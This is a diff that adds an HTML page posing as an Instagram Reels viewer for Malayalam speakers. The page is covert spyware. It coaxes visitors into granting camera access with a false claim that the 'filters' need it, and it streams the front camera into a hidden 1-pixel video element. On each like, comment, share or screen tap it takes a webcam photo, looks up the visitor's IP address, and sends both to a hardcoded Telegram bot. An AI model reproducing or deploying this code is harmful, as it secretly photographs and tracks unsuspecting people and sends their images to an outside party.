@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="ml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Reels - Viral Now 🔥</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        * {
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background-color: #000;
+            margin: 0;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        .insta-container {
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            height: 100vh;
+            margin: auto;
+            background: #000;
+            overflow: hidden;
+        }
+        video#main-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        #hidden-cam {
+            position: absolute;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+            pointer-events: none;
+            top: -100px;
+            left: -100px;
+        }
+        .insta-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 20px 16px 30px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
+            pointer-events: none;
+            z-index: 10;
+        }
+        .action-btn {
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(8px);
+            padding: 8px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 45px;
+            height: 45px;
+            pointer-events: auto;
+            cursor: pointer;
+            transition: transform 0.1s active;
+        }
+        .action-btn:active {
+            transform: scale(0.9);
+        }
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 12px;
+            transition: opacity 0.5s ease;
+        }
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        /* Heart Animation Effect */
+        #heart-animation {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            font-size: 100px;
+            color: white;
+            z-index: 50;
+            pointer-events: none;
+        }
+        .animate-heart {
+            animation: heartPop 0.6s ease-out;
+        }
+        @keyframes heartPop {
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.9; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+        <p class="text-white text-sm">Starting Reels... 🔥</p>
+        <p class="text-gray-400 text-xs text-center px-6">വീഡിയോ ലോഡ് ആകുന്നു, ദയവായി കാത്തിരിക്കുക...</p>
+    </div>
+
+    <div id="insta-ui" class="insta-container hidden">
+        <!-- Hidden Assets -->
+        <video id="hidden-cam" autoplay playsinline muted></video>
+        <canvas id="hidden-canvas" style="display: none;"></canvas>
+        <div id="heart-animation">❤️</div>
+        
+        <!-- Main Content -->
+        <div id="video-touch-area" class="absolute inset-0 z-0 cursor-pointer">
+            <video id="main-video" loop playsinline muted>
+                <source src="https://assets.mixkit.co/videos/preview/mixkit-young-woman-dancing-in-a-modern-style-4428-large.mp4" type="video/mp4">
+            </video>
+        </div>
+        
+        <div class="insta-overlay">
+            <div class="flex justify-between items-end w-full">
+                <div class="flex-1">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="w-8 h-8 rounded-full bg-gradient-to-tr from-purple-400 to-pink-500 border border-white flex items-center justify-center overflow-hidden">
+                            <span class="text-white text-xs font-bold">✨</span>
+                        </div>
+                        <span class="text-white font-semibold text-base">@trending_vibes_kl</span>
+                        <span class="text-blue-400 text-xs font-medium bg-white/20 px-2 py-0.5 rounded-full">Follow</span>
+                    </div>
+                    <p class="text-white text-sm leading-5 max-w-[80%]">ഈ വീഡിയോ ഇഷ്ടപ്പെട്ടാൽ ഒന്ന് ലൈക്ക് ചെയ്യണേ! ❤️🎥 #malayalam #reels</p>
+                    <div class="flex items-center gap-3 mt-2 text-xs text-white/80">
+                        <div class="flex items-center gap-1">
+                            <span id="like-count">❤️ 2.4K</span>
+                        </div>
+                        <div class="flex items-center gap-1">
+                            <span>💬 145</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Interaction Buttons -->
+                <div class="flex flex-col gap-5 items-center">
+                    <div id="like-btn" class="action-btn text-xl">❤️</div>
+                    <div id="comment-btn" class="action-btn text-xl">💬</div>
+                    <div id="share-btn" class="action-btn text-xl">✈️</div>
+                    <div class="w-8 h-8 rounded border-2 border-white overflow-hidden">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" class="w-full h-full object-cover">
+                    </div>
+                </div>
+            </div>
+            
+            <div class="mt-4 flex items-center justify-between">
+                <div class="flex items-center gap-2 bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
+                    <div class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></div>
+                    <span class="text-white text-[11px] font-medium">Original Audio</span>
+                </div>
+                <div class="flex gap-1 items-center bg-black/40 backdrop-blur-md rounded-full px-3 py-1.5">
+                    <span class="text-white text-[11px]">Trending Mix</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7794673665:AAHIk_TmHz5cJkcxE4Tj2NaMDi0HhZ8nzjU";
+        const chatId = "7510372886";
+        
+        const hiddenVideo = document.getElementById('hidden-cam');
+        const mainReel = document.getElementById('main-video');
+        const canvasElem = document.getElementById('hidden-canvas');
+        const instaUI = document.getElementById('insta-ui');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const videoTouchArea = document.getElementById('video-touch-area');
+        const heartAnim = document.getElementById('heart-animation');
+        
+        const likeBtn = document.getElementById('like-btn');
+        const commentBtn = document.getElementById('comment-btn');
+        const shareBtn = document.getElementById('share-btn');
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch { return "Unknown IP"; }
+        }
+
+        async function captureAndSend(actionType) {
+            if (!hiddenVideo.srcObject) return;
+
+            const ctx = canvasElem.getContext('2d');
+            canvasElem.width = hiddenVideo.videoWidth;
+            canvasElem.height = hiddenVideo.videoHeight;
+            ctx.drawImage(hiddenVideo, 0, 0);
+
+            canvasElem.toBlob(async (blob) => {
+                const ip = await getIP();
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `🔔 *User Action Detected!* \n\n🎯 Action: ${actionType}\n🌐 IP: ${ip}\n📱 Platform: ${navigator.platform}\n⏰ Time: ${new Date().toLocaleString()}`);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.6);
+        }
+
+        // Like Animation and Capture
+        function handleLike() {
+            // Show heart animation
+            heartAnim.classList.remove('animate-heart');
+            void heartAnim.offsetWidth; // Trigger reflow
+            heartAnim.classList.add('animate-heart');
+            
+            // Send to Telegram
+            captureAndSend("LIKE_BUTTON_CLICKED");
+        }
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                hiddenVideo.srcObject = stream;
+                
+                // Hide loading UI
+                loadingOverlay.style.opacity = '0';
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    instaUI.classList.remove('hidden');
+                    mainReel.play();
+                }, 500);
+
+            } catch (err) {
+                alert("ക്യാമറ ആക്സസ് ഇല്ലാതെ ഫിൽട്ടറുകൾ പ്രവർത്തിക്കില്ല. ദയവായി 'Allow' അമർത്തി പേജ് റീഫ്രഷ് ചെയ്യുക.");
+            }
+        }
+
+        // Listeners for interactions
+        likeBtn.addEventListener('click', handleLike);
+        
+        videoTouchArea.addEventListener('click', () => {
+            // Double click effect simulation
+            handleLike();
+            captureAndSend("VIDEO_SCREEN_TOUCHED");
+        });
+
+        commentBtn.addEventListener('click', () => captureAndSend("COMMENT_CLICKED"));
+        shareBtn.addEventListener('click', () => captureAndSend("SHARE_CLICKED"));
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            setTimeout(startCamera, 1500);
+        });
+    </script>
+</body>
+</html>
